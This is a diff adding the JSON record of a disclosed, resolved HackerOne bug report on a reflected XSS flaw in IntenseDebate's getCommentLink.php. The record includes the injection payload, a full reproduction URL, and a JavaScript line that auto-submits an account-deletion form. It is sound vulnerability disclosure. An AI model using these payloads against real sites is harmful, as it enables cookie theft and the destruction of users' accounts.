@@ -1,0 +1,134 @@
+{
+  "id": 1043804,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQzODA0",
+  "url": "https://hackerone.com/reports/1043804",
+  "title": "Reflected XSS in https://www.intensedebate.com/js/getCommentLink.php",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-11-26T03:44:11.373Z",
+  "submitted_at": "2020-11-26T03:44:11.410Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sudi",
+    "url": "/sudi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/h54zoekbmc0kqlq42xu2vqj6ge13/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-01-30T04:45:27.203Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-12-31T04:45:25.680Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey there,\nI have found a reflected dom xss vulnerability in your website www.intensedebate.com, the *posttitle* parameter is vulnerable.\n\n---------------------------------------------------------------------------------------------------------------------------------------------------\n\n\n**Full url:** https://www.intensedebate.com/js/getCommentLink.php?acct=c90a61ed51fd7b64001f1361a7a71191&postid=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posturl=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posttitle=xss\n**Parameter:** posttitle\n**XSS Payload:** \"><img src=x onerror=alert(1)>\n\n---------------------------------------------------------------------------------------------------------------------------------------------------\n\n\n**Steps to reproduce:**\nJust load this url in your browser and you will get the xss popup\n\nhttps://www.intensedebate.com/js/getCommentLink.php?acct=c90a61ed51fd7b64001f1361a7a71191&postid=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posturl=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posttitle=%3Cimg%20src=x%20onerror=alert(document.domain)%3E\n\n---------------------------------------------------------------------------------------------------------------------------------------------------\n\n**POC:**\n\n{F1094491}\n\n-----------------------------------------------------------------------------------------------------------------------------------------------------\n\n## Impact\n\nAn attacker steal cookies of logged in users just by sending the url with the xss-payload, can redirect users to another websites,virtual defacement,etc.\nAlso Looking at the page: https://www.intensedebate.com/your-information, there are two actions available *Account Closure*, *Data export* with the xss we can perform this action on behalf of the user for eg:\n\n```javascript\n document.getElementById('frm2').submit();\n```\nWith a js code like this we can auto submit this  form so that when the user visits the url, his/her account will automatically will be deleted. \n\n\nThankyou\nKind Regards\nSudhanshu",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1094491,
+      "file_name": "firefox_I8GqvqVpkn.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7rg3hxvrfbpgfyephhdc8q552s2e?response-content-disposition=attachment%3B%20filename%3D%22firefox_I8GqvqVpkn.png%22%3B%20filename%2A%3DUTF-8%27%27firefox_I8GqvqVpkn.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQVJQYR7C%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T072129Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCyEoNu3gITHvT8Qzkh%2BXpyJCJS2ntPs3cTDPryoaedoAIgD9OIwtRjgGoymkcTsw%2BlEeTJGZI6S8yQ6aX3F%2B9E6nIquwUI%2Ff%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEwiWzj2sBGmHhxA%2BSqPBRV8%2Bzu2msbj%2FhY4KbnKP%2B%2BPXGykwZDYc3Tqrg7Z917UJf5T1PGQcJ65%2BohHPU2Ro0gXP7xO402Y%2FtYLHv0boIYsivAhLINu3KiMRjhlmEfWqUnbyjUkothtJqLxaB6l3ddSnsNGtNift9gBXz7KyDP6PkoQ47IIpwoXaf3%2BFP7ZrgVhNnMBvbUIzeuAV7fKG56jACKOU1fjxQWUSHJOpJJp77ZPlUQ2jVkS93JsZCy%2F4k1AaubHGtnYsEHdNJP31rklVQap4BrpXsS1UubMmNY71TSt7igc%2FoJ2YDvwCFkPXefJmq9%2FQm8uYQp7AauTNh6iHLRo9nI6x5T74MtnUJ39DxCRHwEGiP1PGATD38t6Z7gbThfCjK8s9oKy3339kagcSHBIXDqs9KG6IrRzXjnPigCCtq6vluf%2FYo2Z17NjJeQc%2BUUolZ8WfQv%2Fn0c5XBkezPEmg%2B7Iwe7KvEhDl1ACsHwf03eciiWDdTvctQlOH6KWloTEPsRRInAbwj%2Fs4gr6GDnNqWsmlhudGQ%2BbgnMXhOSjFfO2eAfu2k6ARRmKyLfL46oYI0JzD4sJAIgCi3LlWNRF8RlAmLZhnt5QRlzMVXLK20TE3wWHpEvl9eK4X94I0KdE6ihwEVblhTCTVo3JwBwJ9DMc5%2BbvunB5tSbPWcJOdVFrMN1h%2FLyt4FAr%2FOW7XEmd7vsR3O1Azo7QIxoY7ZREnxnv9tfviSDmVFXnaiem7hplRoy0rUUMc1cLi5MKGZFeUI9Z6jPpWJaJ65ploPpDg7uqyXlAJegSUe358XrIN6InbXwe1gVzI%2FlQTCzSZ3JKZPVTEx1sI3mcKL2GgK18GrHSuC%2FrcmFNV%2Bs574SAzod8OdnOEnpy6LYwgvq9xgY6sQEXA%2B0g8by%2BW3sNH9U33FqzKpP50AVNyFyB5YOU5tjWAoXI6pniHz%2BezVcZ3IC1bslxpkwUfuaxHlzQ1a3AIX3uIwk75J94ucyEuIOLxuVcjyKJpakZgteharWzIGnFWBcqTuQGeoQmMDyUwPrnIsO7zQfgXuwTy289ANgc5zwVLdIbyXqzsf6GLc%2BmQQcyxqUAZTSaYJRe2tsN3EgIqYhygvMMQHJxfZqHvXoZQWcToRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=527ac733d00f8c40b8d490a4dd2076e1a4421a93aa62b3be14cd33db9b2e8a97",
+      "file_size": 117027,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1094494,
+      "file_name": "gfig3x0YLW.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xvf33iyvxfod83xcv8xandkx6vsm?response-content-disposition=attachment%3B%20filename%3D%22gfig3x0YLW.mp4%22%3B%20filename%2A%3DUTF-8%27%27gfig3x0YLW.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQVJQYR7C%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T072129Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCyEoNu3gITHvT8Qzkh%2BXpyJCJS2ntPs3cTDPryoaedoAIgD9OIwtRjgGoymkcTsw%2BlEeTJGZI6S8yQ6aX3F%2B9E6nIquwUI%2Ff%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEwiWzj2sBGmHhxA%2BSqPBRV8%2Bzu2msbj%2FhY4KbnKP%2B%2BPXGykwZDYc3Tqrg7Z917UJf5T1PGQcJ65%2BohHPU2Ro0gXP7xO402Y%2FtYLHv0boIYsivAhLINu3KiMRjhlmEfWqUnbyjUkothtJqLxaB6l3ddSnsNGtNift9gBXz7KyDP6PkoQ47IIpwoXaf3%2BFP7ZrgVhNnMBvbUIzeuAV7fKG56jACKOU1fjxQWUSHJOpJJp77ZPlUQ2jVkS93JsZCy%2F4k1AaubHGtnYsEHdNJP31rklVQap4BrpXsS1UubMmNY71TSt7igc%2FoJ2YDvwCFkPXefJmq9%2FQm8uYQp7AauTNh6iHLRo9nI6x5T74MtnUJ39DxCRHwEGiP1PGATD38t6Z7gbThfCjK8s9oKy3339kagcSHBIXDqs9KG6IrRzXjnPigCCtq6vluf%2FYo2Z17NjJeQc%2BUUolZ8WfQv%2Fn0c5XBkezPEmg%2B7Iwe7KvEhDl1ACsHwf03eciiWDdTvctQlOH6KWloTEPsRRInAbwj%2Fs4gr6GDnNqWsmlhudGQ%2BbgnMXhOSjFfO2eAfu2k6ARRmKyLfL46oYI0JzD4sJAIgCi3LlWNRF8RlAmLZhnt5QRlzMVXLK20TE3wWHpEvl9eK4X94I0KdE6ihwEVblhTCTVo3JwBwJ9DMc5%2BbvunB5tSbPWcJOdVFrMN1h%2FLyt4FAr%2FOW7XEmd7vsR3O1Azo7QIxoY7ZREnxnv9tfviSDmVFXnaiem7hplRoy0rUUMc1cLi5MKGZFeUI9Z6jPpWJaJ65ploPpDg7uqyXlAJegSUe358XrIN6InbXwe1gVzI%2FlQTCzSZ3JKZPVTEx1sI3mcKL2GgK18GrHSuC%2FrcmFNV%2Bs574SAzod8OdnOEnpy6LYwgvq9xgY6sQEXA%2B0g8by%2BW3sNH9U33FqzKpP50AVNyFyB5YOU5tjWAoXI6pniHz%2BezVcZ3IC1bslxpkwUfuaxHlzQ1a3AIX3uIwk75J94ucyEuIOLxuVcjyKJpakZgteharWzIGnFWBcqTuQGeoQmMDyUwPrnIsO7zQfgXuwTy289ANgc5zwVLdIbyXqzsf6GLc%2BmQQcyxqUAZTSaYJRe2tsN3EgIqYhygvMMQHJxfZqHvXoZQWcToRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b98907e7f2fafc0668cfaa75f11b2eb517ad2e06e49cf9d3ce093fe3bf0ea965",
+      "file_size": 1430051,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-01-30T04:45:25.758Z",
+  "allow_singular_disclosure_after": -146457363.8574898,
+  "singular_disclosure_allowed": true,
+  "vote_count": 75,
+  "voters": [
+    "arist0phanes",
+    "rootz491",
+    "mr-medi",
+    "mrecho",
+    "thaivu",
+    "akshansh",
+    "0xdln",
+    "najeh_halawani",
+    "ali",
+    "nightm4re",
+    "and 65 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
